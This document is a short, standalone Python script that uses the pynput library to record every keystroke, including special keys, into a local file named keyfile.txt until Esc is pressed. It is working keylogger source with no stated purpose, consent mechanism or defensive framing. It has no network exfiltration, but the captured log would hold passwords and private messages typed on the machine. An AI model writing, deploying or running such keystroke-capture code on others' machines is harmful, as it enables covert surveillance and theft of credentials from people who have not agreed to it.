from pynput import keyboard

# Path to the log file
log_file = "keyfile.txt"

# Function to handle key press events
def keyPressed(key):
    with open(log_file, 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)
            else:
                if key == keyboard.Key.space:
                    logKey.write(' ')
                elif key == keyboard.Key.enter:
                    logKey.write('\n')
                elif key == keyboard.Key.tab:
                    logKey.write('\t')
                else:
                    logKey.write(f'[{key}]')
        except Exception as e:
            print(f"Error logging key: {e}")

# Function to handle key release events
def keyReleased(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

if __name__ == "__main__":
    # Set up the listener
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()

    # Keep the program running
    listener.join()
